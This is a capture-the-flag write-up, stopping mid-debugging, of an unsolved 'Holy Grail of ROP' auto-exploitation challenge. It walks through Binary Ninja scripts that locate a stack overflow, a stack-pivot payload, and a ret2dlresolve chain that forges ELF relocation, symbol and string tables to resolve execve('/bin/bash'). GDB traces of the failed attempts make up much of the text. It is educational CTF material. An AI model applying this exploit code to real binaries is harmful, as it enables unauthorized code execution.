# Holy Grail of ROP

*The ROP God has tasked King Arthur with finding the function called "holy_grail". You must aid him on his quest! But be warned, the way is guarded by a text-based sorcerer whom loves old British comedy movies, and just to make things harder, you're going to have to find "holy_grail" 3 times! ...Or was it 5 times? Use your pwning knowledge to answer the sorcerer's questions and ROP your way to the holy grail and bring this holy relic home for the glory of England!*


Given: `ctf.battelle.org 30042`


Full disclaimer I didn't solve it as I gave up too early due to a stupid mistake. Holy Grail of ROP was my first autopwn challenge and I loved it. Being my first autopwn there are many things that I could have done better so be sure to check out these writeups to see a better alternative.

https://debugmen.dev/ctf-writeup/2022/01/14/holygrail.html


### tl;dr 
Parse binary with Binja to find vuln-> Stack Pivot-> Place fake link map-> Ret2dlResolve

<h2>Stage 1: Parsing</h2>

Unlike the classical pwn challenge, their is no binary provided. Connecting to the service seems to give us a new binary each time. First things first dump the binary locally so other tools can access it. One important thing to note is to give it a random name, this way you can spam connections and not have namespace collisions.

```python
from pwn import *
import random
import string


r = remote("ctf.battelle.org",30042)
file_name = (''.join(random.choices(string.ascii_lowercase, k=10)))
binary_name = "tmp/" + file_name
r.recvuntil(b"********************************")
binary = r.recvuntil(b"********************************").replace(b"********************************",b"")[1:]

with open(binary_name, 'wb') as f:
    f.write(binary)
system(f"chmod +x {binary_name}")
```

<h2>Stage 2: Disassemly</h2>

Checksec shows no protections except NX.
```
[*] '/home/ex/ctf/battelle/holy_grail/tmp_bin'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

The main function seems to call 2 functions. The first one just calls setvbuf to disable buffering, a common CTF thing so nothing to worry about.
The second one will read in user input and then compare it to a string in the data section. Depending on the output it will call other functions that are similarly shaped.
```
int32_t sub_8048579()
{
    void var_33;
    memset(&var_33, 0, 0x23);
    read(0, &var_33, 0x1f);
    int32_t eax_4;
    if (strncmp(data_804b02c, &var_33, strlen(data_804b02c)) != 0)
    {
        eax_4 = sub_804867d();
    }
    else
    {
        eax_4 = sub_80485fb();
    }
    return eax_4;
}
```
After a couple of calls their an "end" function that reads in data and does a final strncmp.
```
int32_t sub_8048ae0()
{
    char const* const var_10 = "You're using coconuts!";
    void var_29;
    memset(&var_29, 0, 0x19);
    read(0, &var_29, 0x15);
    return strncmp(data_804b058, &var_29, strlen(data_804b058));
}
```

At this point, I didn't want to look through these functions but I assumed that at least one of these should have a buffer overflow. I noticed that there was a call to memset on the buffer on the stack so if the read size was larger than that memset then that function should be vuln. Just bought Binary Ninja recently and decided to give it a try. I search through all the functions that returned `int32_t` and then checked the params of memset and read. Indeed there is a vuln function. 

```python
import binaryninja

bv = binaryninja.open_view(binary_name)
bv.rebase(0x08048000)

custom = []
for i in (bv.functions):
    if i.return_type.get_string() == 'int32_t':
        if "sub_" in i.name:
            custom.append(i)

for i in custom:
    try:
        read_size = ((list(i.high_level_il.instructions)[3]).params[-1].constant)
        memset_size = ((list(i.high_level_il.instructions)[2]).params[-1].constant)
        if read_size > memset_size:
            print("BOF FUNC FOUND")
            vuln = i
            break
    except Exception as e:
        pass

```

```
int32_t sub_804897b{()

{
    char const* const var_10 = "WHAT is your quest?";
    void var_7a;
    memset(&var_7a, 0, 0x6a);
    read(0, &var_7a, 0x130);
    return strncmp(data_804b04c, &var_7a, strlen(data_804b04c));
}
```

With the address of the vuln function we just need to find a function that calls it. Luckily Binary Ninja has a callee function so we can just climb those until we hit main.

```python 
func_list = []
while vuln.callers:
    func_list.append(vuln)
    vuln = vuln.callers[0]
```

Now that we have a path to a vuln function we just need to pass or fail the strncmp's to get a buffer overflow. The parameter to the strncmp is a pointer to a pointer so using read we can get the string in the binary. The code for this part is really ugly so be sure to check out the other writeups. We can also grab the buffer size by checking the stack size
```python 
func_list = func_list[::-1][1:]

inputs = []
for i in range(len(func_list) -1):
    if list(func_list[i].high_level_il.instructions)[7].operands[1].tokens[0].value == func_list[i+1].address_ranges[0].start:
        print("TAKE RIGHT, PASS")

        pointer = bv.read(list(func_list[i].high_level_il.instructions)[5].operands[0].operands[0].operands[1][0].operands[0].value.value , 4)
        addr = struct.unpack("<l",pointer )[0]
        val= b''
        while b'\x00' not in val:
            val+= bv.read(addr+ len(val),1)
        inputs.append(val)

    elif list(func_list[i].high_level_il.instructions)[6].operands[1].tokens[0].value == func_list[i+1].address_ranges[0].start:
        print("TAKE LEFT, FAIL")
        inputs.append(b"ex")
    else:
        print("BROKE")

bof_size = abs(list(og_vuln.high_level_il.instructions)[1].var.storage)
```

Running in GDB we can confirm that indeed we do have buffer overflow
```gdb 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0x41
$edx   : 0x08048f1e  →  "It is the rabbit!"
$esp   : 0xff94dda0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0xff94dfe4  →  0xff94ffb4  →  "./tmp/binary1"
$edi   : 0xf7f35b80  →  0x00000000
$eip   : 0x41414141 ("AAAA"?)
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xff94dda0│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $esp
0xff94dda4│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xff94dda8│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xff94ddac│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xff94ddb0│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xff94ddb4│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xff94ddb8│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xff94ddbc│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "binary1", stopped 0x41414141 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x $esp
0xff94dda0:     0x41414141
gef➤  x $eip
0x41414141:     Cannot access memory at address 0x41414141
```

Here was when the fun stuff started to happen. For the longest time I assumed it was just a simple ROP challenge but the gadgets in the binary were really bad. There were a couple of gadgets that could be used to stack pivot but nothing to pop registers for a syscall and the GOT had no functions to leak. At this point, I realized that the so-called holy grail of ROP must be dl_resolve. We can call read@plt and the lack of PIE allows us to read into bss or data section. First I did a stack pivot to read more data and setup for the dl_resolve.

```python 
fake_stack = exe.bss() + 0xa00
fake_link_map_addr = exe.bss() + 0xa00 + 0x100 +8

payload = flat([ 
    b"A"*(bof_size),
    # read into fake stack
    exe.plt.read,
    # pops read jump values and new ebp
    stack_gad,
    0, fake_stack, 0x400,
    fake_stack,
    # Next RIP,pivot now
    leave_ret,
    ])
p.send(payload)
```

In this writeup, I will discuss all my failed attempts as well because they show how much there is to Ret2dlResolve. 

<h2>Attempt 1: Ret2dlResolve</h2>

This exploit is what I think of when I heard ret2dlResolve and it involves construction of a bunch of fake tables. 

When a function is called for the first time and lazy loading is used(partial-Relo) the plt function will jump to the address in the GOT. When the GOT is first created it holds points back into the plt which will call dl_resolve. 
``` 
gef➤  x/4i 134513552
   0x8048390 <read@plt>:        jmp    DWORD PTR ds:0x804b00c     # CALLS GOT
   0x8048396 <read@plt+6>:      push   0x0                        # Uninislized GOT calls back here  
   0x804839b <read@plt+11>:     jmp    0x8048380
   0x80483a0 <strlen@plt>:      jmp    DWORD PTR ds:0x804b010
gef➤  x/wx 0x804b00c
0x804b00c <read@got.plt>:       0x08048396
gef➤  x/3i 0x08048396
   0x8048396 <read@plt+6>:      push   0x0
   0x804839b <read@plt+11>:     jmp    0x8048380
   0x80483a0 <strlen@plt>:      jmp    DWORD PTR ds:0x804b010
gef➤  x/3i 0x8048380
   0x8048380:   push   DWORD PTR ds:0x804b004
   0x8048386:   jmp    DWORD PTR ds:0x804b008
   0x804838c:   add    BYTE PTR [eax],al
gef➤  x/1wx 0x804b008
0x804b008:      0xf7fd8fe0
gef➤  x/10i 0xf7fd8fe0
=> 0xf7fd8fe0 <_dl_runtime_resolve>:    endbr32
   0xf7fd8fe4 <_dl_runtime_resolve+4>:  push   eax
   0xf7fd8fe5 <_dl_runtime_resolve+5>:  push   ecx
   0xf7fd8fe6 <_dl_runtime_resolve+6>:  push   edx
   0xf7fd8fe7 <_dl_runtime_resolve+7>:  mov    edx,DWORD PTR [esp+0x10]
   0xf7fd8feb <_dl_runtime_resolve+11>: mov    eax,DWORD PTR [esp+0xc]
   0xf7fd8fef <_dl_runtime_resolve+15>: call   0xf7fd6e90 <_dl_fixup>
   0xf7fd8ff4 <_dl_runtime_resolve+20>: pop    edx
   0xf7fd8ff5 <_dl_runtime_resolve+21>: mov    ecx,DWORD PTR [esp]
   0xf7fd8ff8 <_dl_runtime_resolve+24>: mov    DWORD PTR [esp],eax
```

For dl_resolve there are 2 main structs and three sections that we need to know about
``` 
gef➤  ptype Elf32_Rel
type = struct {
    Elf32_Addr r_offset;
    Elf32_Word r_info;
}
gef➤  ptype Elf32_Sym
type = struct {
    Elf32_Word st_name;
    Elf32_Addr st_value;
    Elf32_Word st_size;
    unsigned char st_info;
    unsigned char st_other;
    Elf32_Section st_shndx;
}
```

```
 ~/ctf-writeups/battelle/holy_grail/tmp   main ?  readelf -d tmp_bin2   ✔  2527  22:18:05

Dynamic section at offset 0x1f10 contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x8048350
 0x0000000d (FINI)                       0x8048d24
 0x00000019 (INIT_ARRAY)                 0x804af08
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x804af0c
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
*0x00000005 (STRTAB)                     0x804826c             <======
*0x00000006 (SYMTAB)                     0x80481cc             <======
 0x0000000a (STRSZ)                      111 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804b000
 0x00000002 (PLTRELSZ)                   48 (bytes)
 0x00000014 (PLTREL)                     REL
*0x00000017 (JMPREL)                     0x8048320             <=====
 0x00000011 (REL)                        0x8048310
 0x00000012 (RELSZ)                      16 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482f0
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482dc
 0x00000000 (NULL)                       0x0
```

The first value that is pushed is the functions offset in the jmprel.

The jmprel holds a bunch of Elf32_Rel's
```c
gef➤  p *(Elf32_Rel[6]*)0x8048320
$6 = {{
    r_offset = 0x804b00c,
    r_info = 0x107
  }, {
    r_offset = 0x804b010,
    r_info = 0x307
  }, {
    r_offset = 0x804b014,
    r_info = 0x407
  }, {
    r_offset = 0x804b018,
    r_info = 0x507
  }, {
    r_offset = 0x804b01c,
    r_info = 0x607
  }, {
    r_offset = 0x804b020,
    r_info = 0x807
  }}
gef➤
```

R_offset is the GOT address of the function, this tells dl_resolve where to write the pointers once they are resolved. 

R_Info is divided into 2 more fields, R_TYPE and R_SYM. The last two bytes is R_TYPE, its always 7 for GOT entries. R_SYM is a value offset in the SYMTAB.

The SYMTAB holds a bunch of ELF32_Sym
```c
gef➤  p *(Elf32_Sym[6]*)0x80481cc
$3 = {{
    st_name = 0x0,
    st_value = 0x0,
    st_size = 0x0,
    st_info = 0x0,
    st_other = 0x0,
    st_shndx = 0x0
  }, {
    st_name = 0x30,
    st_value = 0x0,
    st_size = 0x0,
    st_info = 0x12,
    st_other = 0x0,
    st_shndx = 0x0
  }, {
    st_name = 0x60,
    st_value = 0x0,
    st_size = 0x0,
    st_info = 0x20,
    st_other = 0x0,
    st_shndx = 0x0
  }, {
    st_name = 0x22,
    st_value = 0x0,
    st_size = 0x0,
    st_info = 0x12,
    st_other = 0x0,
    st_shndx = 0x0
  }, {
    st_name = 0x44,
    st_value = 0x0,
    st_size = 0x0,
    st_info = 0x12,
    st_other = 0x0,
    st_shndx = 0x0
  }, {
    st_name = 0x3c,
    st_value = 0x0,
    st_size = 0x0,
    st_info = 0x12,
    st_other = 0x0,
    st_shndx = 0x0
  }}
```

There are a couple of fields here but the main one that we are interested in is st_name. Its the offset into the STRTAB.

The STRTAB is not a struct but rather a bunch of strings that are function names
```
gef➤  x/13s 0x804826c
0x804826c:      ""
0x804826d:      "libc.so.6"
0x8048277:      "_IO_stdin_used"
0x8048286:      "strncmp"
0x804828e:      "strlen"
0x8048295:      "memset"
0x804829c:      "read"
0x80482a1:      "stdout"
0x80482a8:      "setvbuf"
0x80482b0:      "__libc_start_main"
0x80482c2:      "GLIBC_2.0"
0x80482cc:      "__gmon_start__"
0x80482db:      ""
```

So here's my TL;Dr on how to call dl_resolve_runtime
```
push jmp_offset 
dl_runtime_resolve()
jmp_offset + jumprel -(ONE ENTRY) == Elf32_Rel *reloc_table
    *reloc_table + 0 = GOT addr
    *reloc_table + 4 = r_info 
        ELF32_R_SYM  == r_info >>8 
        ELF32_R_TYPE == r_info & 0xff (7 for GOT)

func's symtab == SYMTAB + ELF32_R_SYM * 0x10

name = STRTAB + func's symtab[First entry]
_dl_lookup_symbol_x(name)
```

So when we call dl_resolve we just need to push the jmp_offset and construct a fake symtab, jmptab and strtab. One thing to note is that the SYMTAB Offet must be aligned, just place the structures and check in gdb.

In this exploit the fake_table is created in the BSS and far from our fake stack to avoid collisions. In later exploits this changes to minimize reads. 
```python 
fake_table = exe.bss() + 0x23c 

jmprel = 0x08048320
symtab  = 0x080481cc
strtab  = 0x0804826c

# Placeholders to calc length
fake_jmp = p32(0)  + p32(0)
fake_sym = p32(0) * 4

jmp_offset = fake_table - jmprel
sym_offset = (fake_table +len(fake_jmp) - symtab) // 0x10
assert sym_offset == (fake_table +len(fake_jmp) - symtab) / 0x10
str_offset = fake_table + len(fake_jmp) + len(fake_sym) - strtab

r_info =  (sym_offset << 8)  | 7 

# Address to overwrite, does not matter
fake_jmp = p32(exe.got.memset)  + p32(r_info)
fake_sym = p32(str_offset) + p32(0) + p32(0) +p32(0)
fake_str = b"execve\x00\x00/bin/bash"

fake = fake_jmp + fake_sym + fake_str
```

Here's what out fake structs look like in memory (I replaced the addresses with the names of symbols)
``` 
$eax   : 0x29
$ebx   : 0x0
$ecx   : 0x0804b2a4  →  0x0804b01c  →  0xf7ee6530  →  <__memset_sse2_rep+0> endbr32
$edx   : 0x400
$esp   : 0x0804b988  →  0xf7ff5a40  →  0x00000000
$ebp   : 0x08048485  →   leave
$esi   : 0x0804b2a4  →  0x0804b01c  →  0xf7ee6530  →  <__memset_sse2_rep+0> endbr32
$edi   : 0x400
$eip   : 0xf7fd0fe0  →  <_dl_runtime_resolve+0> endbr32
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0804b988│+0x0000: 0xf7ff5a40  →  0x00000000    ← $esp
0x0804b98c│+0x0004:  test BYTE PTR [edi], ch
0x0804b990│+0x0008:  out dx, eax
0x0804b994│+0x000c: 0x0804b2c4  →  "/bin/bash"
0x0804b998│+0x0010:  add BYTE PTR [eax], al
0x0804b99c│+0x0014:  add BYTE PTR [eax], al
0x0804b9a0│+0x0018:  add BYTE PTR [eax], al
0x0804b9a4│+0x001c:  add BYTE PTR [eax], al
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7fd0fd6 <__tls_init_tp+262> mov    DWORD PTR [eax], 0x20
   0xf7fd0fdc <__tls_init_tp+268> jmp    0xf7fd0f95 <__tls_init_tp+197>
   0xf7fd0fde                  xchg   ax, ax
 → 0xf7fd0fe0 <_dl_runtime_resolve+0> endbr32
   0xf7fd0fe4 <_dl_runtime_resolve+4> push   eax
   0xf7fd0fe5 <_dl_runtime_resolve+5> push   ecx
   0xf7fd0fe6 <_dl_runtime_resolve+6> push   edx
   0xf7fd0fe7 <_dl_runtime_resolve+7> mov    edx, DWORD PTR [esp+0x10]
   0xf7fd0feb <_dl_runtime_resolve+11> mov    eax, DWORD PTR [esp+0xc]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "binary1", stopped 0xf7fd0fe0 in _dl_runtime_resolve (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7fd0fe0 → _dl_runtime_resolve()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/2wx $esp
0x804b988:      0xf7ff5a40      0x00002f84
gef➤  p *(Elf32_Rel*)(JMPREL + 0x00002f84)
$7 = {
  r_offset = 0x804b01c,
  r_info = 0x30e07
}
gef➤  p *(Elf32_Sym*)(SYMTAB + (0x30e07 >>8 )* 0x10)
$8 = {
  st_name = 0x3050,
  st_value = 0x0,
  st_size = 0x0,
  st_info = 0x0,
  st_other = 0x0,
  st_shndx = 0x0
}
gef➤  x/s STRTAB + 0x3050
0x804b2bc:      "execve"
```

At this point, I thought it was done but it kept segfaulting for some reason. 
```gdb 
$eax   : 0x0804b95c  →   or BYTE PTR [edi], dh
$ebx   : 0x0
$ecx   : 0x0
$edx   : 0xf7ff0fc0
$esp   : 0x0804b42c  →   add BYTE PTR [eax], al
$ebp   : 0xf7feba40  →  0x00000000
$esi   : 0x379
$edi   : 0x0804b028  →   add BYTE PTR [eax], al
$eip   : 0xf7fc4f3a  →  <_dl_fixup+170> mov ebx, DWORD PTR [edx+0x4]
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0804b42c│+0x0000:  add BYTE PTR [eax], al      ← $esp
0x0804b430│+0x0004:  add BYTE PTR [eax], al
0x0804b434│+0x0008:  add BYTE PTR [eax], al
0x0804b438│+0x000c: 0x00003634 ("46"?)
0x0804b43c│+0x0010: 0xf7feb000  →  0x00036f2c
0x0804b440│+0x0014: 0x0804826c  →   add BYTE PTR [ecx+ebp*2+0x62], ch
0x0804b444│+0x0018: 0x0804b028  →   add BYTE PTR [eax], al
0x0804b448│+0x001c:  jns 0x804b44d
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7fc4f2b <_dl_fixup+155>  and    edx, 0x7fff
   0xf7fc4f31 <_dl_fixup+161>  shl    edx, 0x4
   0xf7fc4f34 <_dl_fixup+164>  add    edx, DWORD PTR [ebp+0x174]
 → 0xf7fc4f3a <_dl_fixup+170>  mov    ebx, DWORD PTR [edx+0x4]
   0xf7fc4f3d <_dl_fixup+173>  test   ebx, ebx
   0xf7fc4f3f <_dl_fixup+175>  cmove  edx, ecx
   0xf7fc4f42 <_dl_fixup+178>  mov    ebx, DWORD PTR gs:0xc
   0xf7fc4f49 <_dl_fixup+185>  mov    ecx, 0x1
   0xf7fc4f4e <_dl_fixup+190>  test   ebx, ebx
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:./elf/dl-runtime.c+77 ────
     72          {
     73            const ElfW(Half) *vernum =
     74              (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
     75            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
     76            version = &l->l_versions[ndx];
 →   77            if (version->hash == 0)
     78              version = NULL;
     79          }
     80        /* We need to keep the scope around so do some locking.  This is
     81           not necessary for objects which cannot be unloaded or when
     82           we are not using any threads (yet).  */
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "tmp_bin", stopped 0xf7fc4f3a in _dl_fixup (), reason: STOPPED
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7fc4f3a → _dl_fixup(l=0xf7feba40, reloc_arg=0x3634)
[#1] 0xf7fc6ff4 → _dl_runtime_resolve()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x $edx+4
0xf7ff0fc4:     Cannot access memory at address 0xf7ff0fc4
```


Checking GDB and using the rsi feature it seems that our offset was used as an offset into something. Since out value was so large it ended up going into unmapped memory.
```gdb 
gef➤  x/40i 0xf7fc4f20
   0xf7fc4f20 <_dl_fixup+144>:  lea    ecx,[ebx+esi*2]   # esi holds symtab offset, multiplied by 2
   0xf7fc4f23 <_dl_fixup+147>:  add    ecx,DWORD PTR [edx+0x4]
   0xf7fc4f26 <_dl_fixup+150>:  movzx  edx,WORD PTR [ecx] # Random value in link map
   0xf7fc4f29 <_dl_fixup+153>:  xor    ecx,ecx
   0xf7fc4f2b <_dl_fixup+155>:  and    edx,0x7fff
   0xf7fc4f31 <_dl_fixup+161>:  shl    edx,0x4             # Shifts it a bunch, giant number now
   0xf7fc4f34 <_dl_fixup+164>:  add    edx,DWORD PTR [ebp+0x174]
=> 0xf7fc4f3a <_dl_fixup+170>:  mov    ebx,DWORD PTR [edx+0x4]   <======= SEG HERE
```

More GDB shows that sometimes the random value would be null, in this case, the mov would be sucessful as 0 shifted it still 0.
```gdb 
$eax   : 0x0804b27c  →  0x00003020 (" 0"?)
$ebx   : 0x0
$ecx   : 0x080488f2  →   shl BYTE PTR [ebp+0x7], 0xe8
$edx   : 0x0804afc0  →   lock (bad)
$esp   : 0x0804b92c  →   add BYTE PTR [eax], al
$ebp   : 0xf7fa2a40  →  0x00000000
$esi   : 0x30b
$edi   : 0x0804b01c  →  0xf7e93530  →  <__memset_sse2_rep+0> endbr32
$eip   : 0xf7f7bf26  →  <_dl_fixup+150> movzx edx, WORD PTR [ecx]
$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0804b92c│+0x0000:  add BYTE PTR [eax], al      ← $esp
0x0804b930│+0x0004:  add BYTE PTR [eax], al
0x0804b934│+0x0008:  add BYTE PTR [eax], al
0x0804b938│+0x000c: 0x00002f54 ("T/"?)
0x0804b93c│+0x0010: 0xf7fa2000  →  0x00036f2c
0x0804b940│+0x0014: 0x0804826c  →   add BYTE PTR [ecx+ebp*2+0x62], ch
0x0804b944│+0x0018: 0x0804b01c  →  0xf7e93530  →  <__memset_sse2_rep+0> endbr32
0x0804b948│+0x001c:  or eax, DWORD PTR [ebx]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7f7bf1c <_dl_fixup+140>  mov    esi, DWORD PTR [esp+0x1c]
   0xf7f7bf20 <_dl_fixup+144>  lea    ecx, [ebx+esi*2]
   0xf7f7bf23 <_dl_fixup+147>  add    ecx, DWORD PTR [edx+0x4]
 → 0xf7f7bf26 <_dl_fixup+150>  movzx  edx, WORD PTR [ecx]
   0xf7f7bf29 <_dl_fixup+153>  xor    ecx, ecx
   0xf7f7bf2b <_dl_fixup+155>  and    edx, 0x7fff
   0xf7f7bf31 <_dl_fixup+161>  shl    edx, 0x4
   0xf7f7bf34 <_dl_fixup+164>  add    edx, DWORD PTR [ebp+0x174]
   0xf7f7bf3a <_dl_fixup+170>  mov    ebx, DWORD PTR [edx+0x4]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:./elf/dl-runtime.c+75 ────
     70        const struct r_found_version *version = NULL;
     71        if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
     72          {
     73            const ElfW(Half) *vernum =
     74              (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
 →   75            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
     76            version = &l->l_versions[ndx];
     77            if (version->hash == 0)
     78              version = NULL;
     79          }
     80        /* We need to keep the scope around so do some locking.  This is
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "binary1", stopped 0xf7f7bf26 in _dl_fixup (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7f7bf26 → _dl_fixup(l=0xf7fa2a40, reloc_arg=0x2f54)
[#1] 0xf7f7dff4 → _dl_runtime_resolve()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/10wx $ecx
0x80488f2:      0xe80775c0      0x000002ce      0x3be805eb      0x90000003
0x8048902:      0xc9fc5d8b      0xe58955c3      0xa4ec8153      0xe8000000
0x8048912:      0xfffffb3a      0x26eac381
```

Since we have control over the value that gets added to ecx we just need to shift out tables a bit so that it points to those null.

```gdb 
$eax   : 0x0804b2ac  →  0x00003050 ("P0"?)
$ebx   : 0x0
$ecx   : 0x080488f8  →   add BYTE PTR [eax], al
$edx   : 0x0804afc0  →   lock (bad)
$esp   : 0x0804b92c  →   add BYTE PTR [eax], al
$ebp   : 0xf7fdfa40  →  0x00000000
$esi   : 0x30e
$edi   : 0x0804b01c  →  0xf7ed0530  →  <__memset_sse2_rep+0> endbr32
$eip   : 0xf7fb8f26  →  <_dl_fixup+150> movzx edx, WORD PTR [ecx]
$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0804b92c│+0x0000:  add BYTE PTR [eax], al      ← $esp
0x0804b930│+0x0004:  add BYTE PTR [eax], al
0x0804b934│+0x0008:  add BYTE PTR [eax], al
0x0804b938│+0x000c:  test BYTE PTR [edi], ch
0x0804b93c│+0x0010: 0xf7fdf000  →  0x00036f2c
0x0804b940│+0x0014: 0x0804826c  →   add BYTE PTR [ecx+ebp*2+0x62], ch
0x0804b944│+0x0018: 0x0804b01c  →  0xf7ed0530  →  <__memset_sse2_rep+0> endbr32
0x0804b948│+0x001c:  push cs
──────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7fb8f1c <_dl_fixup+140>  mov    esi, DWORD PTR [esp+0x1c]
   0xf7fb8f20 <_dl_fixup+144>  lea    ecx, [ebx+esi*2]
   0xf7fb8f23 <_dl_fixup+147>  add    ecx, DWORD PTR [edx+0x4]
 → 0xf7fb8f26 <_dl_fixup+150>  movzx  edx, WORD PTR [ecx]
   0xf7fb8f29 <_dl_fixup+153>  xor    ecx, ecx
   0xf7fb8f2b <_dl_fixup+155>  and    edx, 0x7fff
   0xf7fb8f31 <_dl_fixup+161>  shl    edx, 0x4
   0xf7fb8f34 <_dl_fixup+164>  add    edx, DWORD PTR [ebp+0x174]
   0xf7fb8f3a <_dl_fixup+170>  mov    ebx, DWORD PTR [edx+0x4]
─────────────────────────────────────────────────────────────── source:./elf/dl-runtime.c+75 ────
     70        const struct r_found_version *version = NULL;
     71        if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
     72          {
     73            const ElfW(Half) *vernum =
     74              (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
 →   75            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
     76            version = &l->l_versions[ndx];
     77            if (version->hash == 0)
     78              version = NULL;
     79          }
     80        /* We need to keep the scope around so do some locking.  This is
──────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "binary1", stopped 0xf7fb8f26 in _dl_fixup (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7fb8f26 → _dl_fixup(l=0xf7fdfa40, reloc_arg=0x2f84)
[#1] 0xf7fbaff4 → _dl_runtime_resolve()
